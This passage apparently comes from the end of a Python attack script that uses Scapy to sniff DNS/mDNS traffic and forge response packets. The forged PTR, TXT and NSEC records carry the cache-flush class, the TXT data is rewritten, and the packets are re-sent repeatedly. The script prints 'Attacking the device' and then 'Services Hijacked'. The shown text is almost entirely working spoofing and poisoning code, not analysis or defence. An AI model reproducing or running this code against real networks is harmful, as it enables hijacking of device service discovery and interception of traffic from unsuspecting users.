                        if forged_packet[sa.DNS].nscount==0:
                            forged_packet[sa.DNS].ns=sa.DNSRR(rrname=packet[sa.DNS].ns[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].ns[i].rdata)

                        else:
                            forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=packet[sa.DNS].ns[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].ns[i].rdata)
                    #     forged_packet[sa.DNS].nscount+=1
                    elif packet[sa.DNS].ns[i].type==16:
                        if forged_packet[sa.DNS].nscount==0:
                            forged_packet[sa.DNS].ns=sa.DNSRR(rrname=packet[sa.DNS].ns[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ns[i].rdata))
                        else:
                            forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=packet[sa.DNS].ns[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ns[i].rdata))
                    elif packet[sa.DNS].ns[i].type==47:
                        for typebit in sl.dns.bitmap2RRlist(packet[sa.DNS].ns[i].typebitmaps):
                            if typebit==1:
                                if forged_packet[sa.DNS].nscount==0:
                                    forged_packet[sa.DNS].ns=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])

                                else:
                                    forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                            #      forged_packet[sa.DNS].nscount+=1
                            elif typebit==12:
                                if forged_packet[sa.DNS].nscount==0:
                                    forged_packet[sa.DNS].ns=sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])

                                else:
                                    forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                                #  forged_packet[sa.DNS].nscount+=1
                            else:
                                if forged_packet[sa.DNS].nscount==0:
                                    forged_packet[sa.DNS].ns=sa.DNSRRNSEC(rrname=packet[sa.DNS].ns[i].rrname,nextname=packet[sa.DNS].ns[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].an[i].typebitmaps)

                                else:
                                    forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRNSEC(rrname=packet[sa.DNS].ns[i].rrname,nextname=packet[sa.DNS].ns[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].ns[i].typebitmaps)
                            #      forged_packet[sa.DNS].nscount+=1  
                #forged_packet[sa.DNS].show()
                del forged_packet.chksum
                sa.send(forged_packet,iface=interface)
                sa.send(forged_packet,iface=interface)
                time.sleep(0.5)
                sa.send(forged_packet,iface=interface)
                resp=True
                return None
print("Attacking the device")

sniffer2=sa.AsyncSniffer(prn=fake,iface=interface)
sniffer2.start()
sa.send(packet)
while(resp==False):
    time.sleep(1)
    sa.send(packet,iface=interface)
print("Services Hijacked")
while(True):
    time.sleep(0.1)